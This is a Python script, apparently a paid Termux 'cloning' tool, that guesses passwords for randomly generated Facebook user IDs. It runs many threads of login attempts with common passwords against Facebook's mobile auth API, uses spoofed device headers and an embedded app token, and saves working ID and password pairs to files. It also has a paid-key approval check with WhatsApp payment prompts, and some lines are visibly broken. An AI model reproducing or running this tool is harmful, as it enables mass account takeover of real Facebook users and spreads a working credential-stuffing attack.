import os
import sys
import time
import importlib
import requests
import json
import random
import datetime
#from rich import print
from rich.style import Style
from rich.text import Text
from time import localtime as lt
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# --- Globals and Constants ---

green = '\x1b[1;32m'
white = '\x1b[1;37m'

ok_tag = random.choice([
    f'{green}[BROTHERS-OK]',
    f'{green}[BROTHERS✓-OK]'
])

loop = 0
oks = []

# --- Functions ---

def lin():
    """Prints a separator line."""
    print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def install_modules(modules):
    """
    Checks if required modules are installed and installs them if missing.
    """
    for module in modules:
        try:
            importlib.import_module(module.split('.')[0])
        except ImportError:
            lin()
            print(f'[✓] Installing {module} module...')
            lin()
            os.system(f'pip install {module.split(".")[0]}')
            time.sleep(1)

def check_ip_status():
    """
    Checks and displays the user's IP address and its status.
    """
    try:
        ip = requests.get('https://api.ipify.org').text
        response = requests.get(f'https://ipinfo.io/{ip}/json')
        data = json.loads(response.text)
        blocked = 'bogon' in data
        lin()
        print(f'\x1b[1;97mYour IP Address: \x1b[1;92m{ip}')
        print(f'\x1b[1;97mStatus: \x1b[1;92m{"Blocked" if blocked else "Active"}')
        lin()
    except Exception as e:
        lin()
        print(f'\x1b[1;91mFailed to check IP status: {e}')
        lin()

def generate_user_agents():
    """
    Generates a list of random user-agent strings for mobile devices.
    """
    android_devices = [
        ('14', 'SM-S928B', 'Galaxy S24 Ultra'), ('14', 'SM-S911B', 'Galaxy S23'), 
        ('13', 'SM-F946B', 'Galaxy Z Fold5'), ('13', 'SM-S918B', 'Galaxy S23 Ultra'), 
        ('14', 'Pixel 8 Pro', ''), ('14', 'Pixel 8', ''), ('13', 'Pixel 7a', ''), 
        ('13', 'Pixel Fold', ''), ('13', 'CPH2581', 'OnePlus Open'), 
        ('13', 'NE2215', 'OnePlus 10T 5G'), ('13', '2210132G', 'Redmi Note 12 Pro+'), 
        ('13', '23049PCD8G', 'Poco X5 Pro'), ('17', 'iPhone15,3', 'iPhone 14 Pro Max'), 
        ('16', 'iPhone14,2', 'iPhone 13 Pro')
    ]
    chrome_versions = ['125.0.6422.112', '124.0.6367.118', '123.0.6312.105', '122.0.6261.90', '121.0.6167.140']
    webkit_versions = ['537.36', '605.1.15', '604.1.38', '603.3.8']
    ua_list = []

    for _ in range(10000):
        if random.random() < 0.85: # Android User-Agent
            version, device, model = random.choice(android_devices)
            chrome = random.choice(chrome_versions)
            webkit = random.choice(webkit_versions)
            ua = (f'Mozilla/5.0 (Linux; Android {version}; {device}) '
                  f'AppleWebKit/{webkit} (KHTML, like Gecko) Chrome/{chrome} '
                  f'Mobile Safari/{webkit}')
        else: # iOS User-Agent
            version, device, model = random.choice([d for d in android_devices if 'iPhone' in d[1]])
            safari_version = random.choice(['605.1.15', '604.1.38'])
            ios_version = f'{random.randint(16, 17)}_{random.randint(0, 6)}'
            ua = (f'Mozilla/5.0 ({device}; CPU iPhone OS {ios_version} like Mac OS X) '
                  f'AppleWebKit/{safari_version} (KHTML, like Gecko) Version/{version}.0 '
                  f'Mobile/15E148 Safari/{safari_version}')
        ua_list.append(ua)

    return ua_list

def main():
    """
    Main function to run the cloning tool.
    """
    user = []
    os.system('clear')
    print(logo)
    check_ip_status()
    print(f' {white}─꯭─̽⃝EXAMPLE ▶︎ {green}10000 - 20000 - 30000')
    lin()
    limit = input(f' {white}─꯭─̽⃝ENTER LIMITS ▶︎ {green}')
    lin()
    os.system('xdg-open https://www.facebook.com/officelwaleed ?mode=r_c')
    os.system('clear')
    print(logo)
    check_ip_status()
    print(f' {white}─꯭─̽⃝EXAMPLE ▶︎ {green}METHOD-1 (2009-2014)')
    lin()
    ask = input(f' {white}─꯭─̽⃝CHOICE ▶︎ {green}')
    lin()
    
    star = '10000' if ask == '1' else '100000'

    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999)))
        user.append(data)

    with ThreadPool(max_workers=40) as sami:
        os.system('clear')
        print(logo)
        check_ip_status()
        print(f' {white}─꯭─̽⃝TOTAL UID ▶︎ {limit} {green}─꯭─̽⃝METHOD ▶︎ {white}{ask}')
        print(f' {white}─꯭─̽⃝TOOL STATUS: {green}ACTIVE')
        lin()
        for mal in user:
            uid = star + mal
            sami.submit(login, uid)

def login(uid):
    """
    Attempts to log in to a Facebook account using a list of passwords.
    """
    global loop, oks
    session = requests.Session()
    
    sys.stdout.write(f'\r\x1b[1;97m─꯭─̽⃝{date} \x1b[1;90m(\x1b[1;97m{loop}\x1b[1;90m) (\x1b[1;92m{len(oks)}\x1b[1;90m)')
    sys.stdout.flush()

    pro = random.choice(ugen)
    passwords = ['123456', '1234567', '12345678', '123456789', '123123', '143143', '1234567890', 'qwerty', '1122334455']

    for pw in passwords:
        try:
            headers = {
                'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'user-agent': pro,
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger'
            }
            url = (f'https://b-api.facebook.com/method/auth.login?format=json&email={uid}'
                   f'&password={pw}&credentials_type=device_based_login_password'
                   f'&generate_session_cookies=1&error_detail_type=button_with_disabled'
                   f'&source=device_based_login&meta_inf_fbmeta=%20'
                   f'&currently_logged_in_userid=0&method=GET&locale=en_US'
                   f'&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler'
                   f'&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true')
            
            rp = session.get(url, headers=headers).json()

            if 'session_key' in rp:
                print(f'\r{ok_tag} {uid} | {pw}')
                with open('/sdcard/BROTHERS-OLD-OK.txt', 'a') as okf:
                    okf.write(f'{uid}|{pw}\n')
                oks.append(uid)
                break
            elif 'www.facebook.com' in rp.get('error_msg', ''):
                print(f'\r{ok_tag} {uid} | {pw}')
                with open('/sdcard/BROTHERS.OK.txt', 'a') as cpf:
                    cpf.write(f'{uid}|{pw}\n')
                oks.append(uid)
                break
            elif 'Please Confirm Email' in str(rp):
                print(f'\r{ok_tag} {uid} | {pw}')
                with open('/sdcard/BROTHERS.DONE.txt', 'a') as done:
                    done.write(f'{uid}|{pw}\n')
                oks.append(uid)
                break

        except Exception as e:
            pass
            
    loop += 1

def meyexudi():
    """
    Handles the approval check for using the tool.
    """
    os.system('clear')
    print(logo)
    
    uuid = f'KHARAL{str(os.getuid())}MODS{str(os.getuid())}PAID.TOOL'
    id = "".join(uuid)
    
    try:
        httpCaht = requests.get('https://github.com/technicalarslan22/Server-Ali/blob/main/Approval.txt').text
        if id in httpCaht:
            msg = str(os.geteuid())
           # main()
            return
        else:
            print(' \x1b[1;32m╭────────────────────────────────────╮')
            print(f' \x1b[1;32m║[𝟷]Key: {id}')
            print(' \x1b[1;32m║[•] FULL HAVY LOGIN WARRANTY')
            print(' \x1b[1;32m║[•] ONLY ACTIVE ID CLONE 100%')
            print(' \x1b[1;32m║[•] ID WILL BE LOGIN 80%')
            print(' \x1b[1;32m║[•] WI-FI  AND DATA BOTH WORKING 100%')
            print(' \x1b[1;32m║[•] 5 DAY 500 RS ')
            print(' \x1b[1;32m║[•] 15 DAY 750 Rs ')
            print(' \x1b[1;32m║[•] 30 DAY 1400 Rs ')
            print(f' \x1b[1;32m║[KEY]: {id}')
            print(' \x1b[1;32m╰────────────────────────────────────╯')
            uname = input('\x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\x1b[1;92m WHAT IS YOUR NAME \x1b[1;91m: \x1b[1;32m')
            input(' \x1b[1;30m╚══[•] IF U WANT APPROVAL THEN PRESS ENTER ')
            tks = f'Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20{id}'
            os.system(f'am start https://wa.me/+923150596250?text={tks}')
            # The original code has a reference to an undefined 'approval' function here.
            # It's likely a placeholder or part of a larger, unincluded codebase.
    except:
        sys.exit()

# --- Initialization and Execution ---

if __name__ == "__main__":
    required_modules = ['requests', 'bs4', 'urllib3', 'rich']
    install_modules(required_modules)
    
    os.system('git pull')
   # os.system('xdg-open https://youtube.com/@kharalmods-y8c?si=JhmO1h1q67lvF-Qe')
   # os.system('pkg install curl -y')
    
    ugen = generate_user_agents()
    
    dic = {
        '1': 'January', '2': 'February', '3': 'March', '4': 'April',
        '5': 'May', '6': 'June', '7': 'July', '8': 'August',
        '9': 'September', '10': 'October', '11': 'November', '12': 'December'
    }
    
    now = datetime.datetime.now()
    tgl = now.day
    bln = dic[str(now.month)]
    thn = now.year
    date = f'{tgl}-{bln}-{thn}'
    
    os.system('xdg-open https://www.facebook.com/officelwaleed
    
    logo = f"""
{green}┏━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
{green}┃{white} ╦ ╦╔═╗╦  ╔═╗╔═╗╔╦╗   ┃ OWNER  : WALEED KING      ┃
{green}┃{white} ║║║╠═╣║  ║╣ ║╣  ║║   ┃ TOOL   : OLD CLONING      ┃
{green}┃{white} ╚╩╝╩ ╩╩═╝╚═╝╚═╝═╩╝   ┃ GITHUB : WALEED-404       ┃
{green}┃{white} THE_BR4ND WALEDD     ┃ STATUS : FREE             ┃
{green}┃{white}   ONIFRE WALEED      ┃ SYSTEM : BYPASSED         ┃
{green}┗━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{white}─꯭─̽⃝DEVELOPER ▶︎ {green}WALEED KING
{white}─꯭─̽⃝TOOL TEAM ▶︎ {green}OWNER WALEED
{white}─꯭─̽⃝TOOL TYPE ▶︎ {green}OLD CLONING
{white}─꯭─̽⃝GITHUB    ▶︎ {green}BROTHERS-404
{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    1
    main()